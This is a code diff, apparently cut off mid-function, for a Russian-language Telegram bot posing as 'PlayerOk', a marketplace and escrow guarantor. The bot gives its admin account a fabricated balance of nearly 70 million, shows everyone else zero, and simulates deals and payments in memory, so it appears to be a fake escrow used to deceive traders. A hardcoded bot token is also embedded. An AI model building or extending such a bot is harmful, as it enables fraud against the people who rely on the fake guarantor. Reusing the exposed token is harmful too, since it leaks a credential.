@@ -4,19 +4,14 @@ const http = require('http');
 const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
 const bot = new Telegraf(BOT_TOKEN);
 
-// Настройки администратора
 const ADMIN_USERNAME = 'k13_way';
-
-// База данных в памяти
 const users = {};
 const deals = {};
 const userStates = {};
 
-// Функция инициализации пользователя
 const initUser = (username) => {
   if (!username) return;
   if (!users[username]) {
-    // Если заходите вы, у вас сразу будет огромный баланс. У остальных пользователей — 0.
     if (username === ADMIN_USERNAME) {
       users[username] = { balance: 69999999.00, deals_count: 0, success_deals: 0 };
     } else {
@@ -25,7 +20,6 @@ const initUser = (username) => {
   }
 };
 
-// Главный текст меню
 const getWelcomeText = () => {
   return `Добро пожаловать 👋\n\n` +
     `✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечение полной безопасности внебиржевых сделок.\n\n` +
@@ -38,7 +32,6 @@ const getWelcomeText = () => {
     `🛡️ Выберите нужный раздел ниже:`;
 };
 
-// Главная инлайн-клавиатура
 const getMainKeyboard = () => {
   return Markup.inlineKeyboard([
     [Markup.button.callback('💳 Баланс', 'menu_balance'), Markup.button.callback('🤝 Создать сделку', 'menu_create')],
@@ -46,14 +39,12 @@ const getMainKeyboard = () => {
   ]);
 };
 
-// Старт бота
 bot.start((ctx) => {
   initUser(ctx.from.username);
   delete userStates[ctx.chat.id];
   return ctx.replyWithMarkdown(getWelcomeText(), getMainKeyboard());
 });
 
-// Кнопка: Баланс
 bot.action('menu_balance', (ctx) => {
   const username = ctx.from.username || 'no_user';
   initUser(username);
@@ -75,7 +66,6 @@ bot.action('menu_balance', (ctx) => {
   }).catch(() => {});
 });
 
-// Кнопка: Поддержка
 bot.action('menu_support', (ctx) => {
   const supportText = 
     `👨‍💻 *Служба поддержки PlayerOk*\n\n` +
@@ -89,7 +79,6 @@ bot.action('menu_support', (ctx) => {
   }).catch(() => {});
 });
 
-// Кнопка: Безопасность
 bot.action('menu_safety', (ctx) => {
   const safetyText = 
     `🛡️ *Правила безопасности PlayerOk*\n\n` +
@@ -104,7 +93,6 @@ bot.action('menu_safety', (ctx) => {
   }).catch(() => {});
 });
 
-// Кнопка: Создать сделку
 bot.action('menu_create', (ctx) => {
   delete userStates[ctx.chat.id];
   const createText = `🤝 *Создание новой безопасной сделки*\n\nВыберите вашу роль в текущей торговой операции:`;
@@ -118,7 +106,6 @@ bot.action('menu_create', (ctx) => {
   }).catch(() => {});
 });
 
-// Роль: Я продаю (Генерация сделки)
 bot.action('role_seller', (ctx) => {
   const username = ctx.from.username;
   if (!username) {
@@ -146,9 +133,8 @@ bot.action('role_seller', (ctx) => {
   }).catch(() => {});
 });
 
-// Обновление статуса для продавца
 bot.action(/^refresh_seller_(.+)$/, (ctx) => {
-  const dealId = ctx.match;
+  const dealId = ctx.match[1];
   const deal = deals[dealId];
   
   if (!deal) return ctx.answerCbQuery('Сделка не найдена.');
@@ -177,7 +163,6 @@ bot.action(/^refresh_seller_(.+)$/, (ctx) => {
   return ctx.answerCbQuery('Покупатель еще не совершил новых действий.', { show_alert: false });
 });
 
-// Роль: Я покупаю (Ввод ID сделки)
 bot.action('role_buyer', (ctx) => {
   userStates[ctx.chat.id] = 'waiting_for_deal_id';
   
@@ -187,7 +172,6 @@ bot.action('role_buyer', (ctx) => {
   }).catch(() => {});
 });
 
-// Обработка текстовых сообщений
 bot.on('text', async (ctx) => {
   const chatId = ctx.chat.id;
   const text = ctx.message.text.trim();
@@ -221,9 +205,8 @@ bot.on('text', async (ctx) => {
   }
 });
 
-// Покупатель оплачивает сделку
 bot.action(/^pay_(.+)$/, (ctx) => {
-  const dealId = ctx.match;
+  const dealId = ctx.match[1];
   const deal = deals[dealId];
 
   if (!deal) return ctx.answerCbQuery('Сделка не найдена.');
@@ -240,9 +223,8 @@ bot.action(/^pay_(.+)$/, (ctx) => {
   }).catch(() => {});
 });
 
-// Продавец нажимает "Товар передан"
 bot.action(/^goods_sent_(.+)$/, (ctx) => {
-  const dealId = ctx.match;
+  const dealId = ctx.match[1];
   const deal = deals[dealId];
 
   if (!deal) return ctx.answerCbQuery('Сделка не найдена.');
@@ -254,3 +236,15 @@ bot.action(/^goods_sent_(.+)$/, (ctx) => {
 
   return ctx.editMessageText(`✅ Вы подтвердили отправку товара по сделке #${dealId}. Ожидаем подтверждения от покупателя.`, {
     ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'to_main_menu')]])
+  }).catch(() => {});
+});
+
+bot.action(/^refresh_buyer_(.+)$/, (ctx) => {
+  const dealId = ctx.match[1];
+  const deal = deals[dealId];
+
+  if (!deal) return ctx.answerCbQuery('Сделка не найдена.');
+
+  if (deal.status === 'goods_sent') {
+    return ctx.editMessageText(`🎁 *Продавец передал товар по сделке #${dealId}!*\n\nЕсли всё верно, подтвердите завершение сделки:`, {
+      parse_mode: 'Markdown',
